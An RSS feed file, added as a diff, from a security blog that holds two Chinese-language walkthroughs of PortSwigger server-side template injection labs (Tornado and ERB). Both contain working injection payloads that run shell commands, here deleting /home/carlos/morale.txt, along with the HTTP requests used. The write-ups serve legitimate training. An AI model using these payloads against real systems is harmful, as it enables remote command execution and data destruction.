@@ -1,0 +1,34 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Ssti on en1r0py</title><link>/tags/ssti/</link><description>Recent content in Ssti on en1r0py</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sun, 05 Jan 2025 21:55:06 +0800</lastBuildDate><atom:link href="/tags/ssti/index.xml" rel="self" type="application/rss+xml"/><item><title>Lab: Basic server-side template injection (code context)</title><link>/portswigger-posts/ssti-lab-server-side-template-injection-basic-code-context/</link><pubDate>Sun, 05 Jan 2025 21:55:06 +0800</pubDate><guid>/portswigger-posts/ssti-lab-server-side-template-injection-basic-code-context/</guid><description>Lab description Solution 点击右上角My account，并使用wiener:peter登录 回到主页点击任意文章，并在Leave a comment处随机填入文字后点击Post Comment 查看留言处所显示的用户名称可以通过My account中的Preferred name进行设置 在Preferred name处下拉选单选择First Name后点击Submit，请求如下 POST /my-account/change-blog-post-author-display HTTP/2 blog-post-author-display=user.first_name&amp;amp;csrf=Nrhbi4xlBpkZgusXl86KkmNp7gqjMEDM 根据题目提示服务端使用Tornado, 其格式为{% somePython %}，构造blog-post-author-display参数为 {% import os %} {{os.system(&amp;#39;rm /home/carlos/morale.txt&amp;#39;) 修改步骤4请求，发送请求后即可解题 POST /my-account/change-blog-post-author-display HTTP/2 blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system(&amp;#39;rm%20/home/carlos/morale.txt&amp;#39;)&amp;amp;csrf=Nrhbi4xlBpkZgusXl86KkmNp7gqjMEDM</description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2025/ssti-lab-server-side-template-injection-basic-code-context-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击右上角&lt;code>My account&lt;/code>，并使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
+&lt;li>回到主页点击任意文章，并在&lt;code>Leave a comment&lt;/code>处随机填入文字后点击&lt;code>Post Comment&lt;/code>&lt;/li>
+&lt;li>查看留言处所显示的用户名称可以通过&lt;code>My account&lt;/code>中的&lt;code>Preferred name&lt;/code>进行设置
+&lt;img alt="Comment" src="/img/2025/ssti-lab-server-side-template-injection-basic-code-context-2.jpg">
+&lt;img alt="Preferred name" src="/img/2025/ssti-lab-server-side-template-injection-basic-code-context-3.jpg">&lt;/li>
+&lt;li>在&lt;code>Preferred name&lt;/code>处下拉选单选择&lt;code>First Name&lt;/code>后点击&lt;code>Submit&lt;/code>，请求如下
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /my-account/change-blog-post-author-display &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>blog-post-author-display=user.first_name&amp;amp;csrf=Nrhbi4xlBpkZgusXl86KkmNp7gqjMEDM
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>根据题目提示服务端使用&lt;code>Tornado&lt;/code>, 其格式为&lt;code>{% somePython %}&lt;/code>，构造&lt;code>blog-post-author-display&lt;/code>参数为
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>{&lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#f92672">import&lt;/span> os &lt;span style="color:#f92672">%&lt;/span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{{os&lt;span style="color:#f92672">.&lt;/span>system(&lt;span style="color:#e6db74">&amp;#39;rm /home/carlos/morale.txt&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>修改步骤4请求，发送请求后即可解题
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /my-account/change-blog-post-author-display &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system(&amp;#39;rm%20/home/carlos/morale.txt&amp;#39;)&amp;amp;csrf=Nrhbi4xlBpkZgusXl86KkmNp7gqjMEDM
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol></content></item><item><title>Lab: Basic server-side template injection</title><link>/portswigger-posts/ssti-lab-server-side-template-injection-basic/</link><pubDate>Sun, 05 Jan 2025 18:31:12 +0800</pubDate><guid>/portswigger-posts/ssti-lab-server-side-template-injection-basic/</guid><description>Lab description Solution 点击第一个商品的View details，商品上方出现Unfortunately this product is out of stock，请求为 GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock 根据题目提示，服务端使用ERB template，其格式为&amp;lt;%= someExpression %&amp;gt; 在浏览器中访问url/?message=&amp;lt;%= 7*7 %&amp;gt;，可在讯息显示处获得49，可以判断此处存在ssti 在浏览器中访问url/?message=&amp;lt;%= system(&amp;quot;rm /home/carlos/morale.txt&amp;quot;) %&amp;gt;即可解题</description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2025/ssti-lab-server-side-template-injection-basic-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击第一个商品的&lt;code>View details&lt;/code>，商品上方出现&lt;code>Unfortunately this product is out of stock&lt;/code>，请求为
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>根据题目提示，服务端使用&lt;code>ERB template&lt;/code>，其格式为&lt;code>&amp;lt;%= someExpression %&amp;gt;&lt;/code>&lt;/li>
+&lt;li>在浏览器中访问url&lt;code>/?message=&amp;lt;%= 7*7 %&amp;gt;&lt;/code>，可在讯息显示处获得&lt;code>49&lt;/code>，可以判断此处存在ssti&lt;/li>
+&lt;li>在浏览器中访问url&lt;code>/?message=&amp;lt;%= system(&amp;quot;rm /home/carlos/morale.txt&amp;quot;) %&amp;gt;&lt;/code>即可解题&lt;/li>
+&lt;/ol></content></item></channel></rss>
